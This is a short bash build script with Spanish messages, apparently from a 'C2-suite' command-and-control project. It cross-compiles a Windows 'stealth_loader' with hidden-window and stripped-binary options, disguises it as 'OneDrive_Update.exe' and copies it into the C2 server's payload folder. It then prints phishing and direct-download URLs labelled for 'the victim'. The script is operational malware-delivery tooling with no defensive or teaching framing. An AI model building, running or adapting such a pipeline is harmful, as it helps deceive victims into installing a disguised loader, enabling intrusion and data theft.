#!/bin/bash
cd ~/C2-suite/bot_cpp_loader

echo "[*] Verificando mingw-w64..."
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[!] Instalando mingw-w64..."
    sudo apt update && sudo apt install -y mingw-w64
fi

echo "[*] Compilando loader..."
x86_64-w64-mingw32-g++ -o OneDrive_Update.exe stealth_loader.cpp \
    -lwininet -s -O2 -static \
    -Wl,--subsystem,windows

if [ $? -eq 0 ]; then
    echo "[+] Compilación exitosa!"
    ls -la OneDrive_Update.exe
    
    # Copiar al servidor
    cp OneDrive_Update.exe ~/C2-suite/c2_server/static/payloads/
    echo "[+] Copiado a c2_server/static/payloads/"
    
    echo ""
    echo "=== URLs PARA LA VÍCTIMA ==="
    echo "Phishing:  http://192.168.1.14:8000/static/phishing_final.html"
    echo "EXE directo: http://192.168.1.14:8000/static/payloads/OneDrive_Update.exe"
else
    echo "[-] Error de compilación"
fi
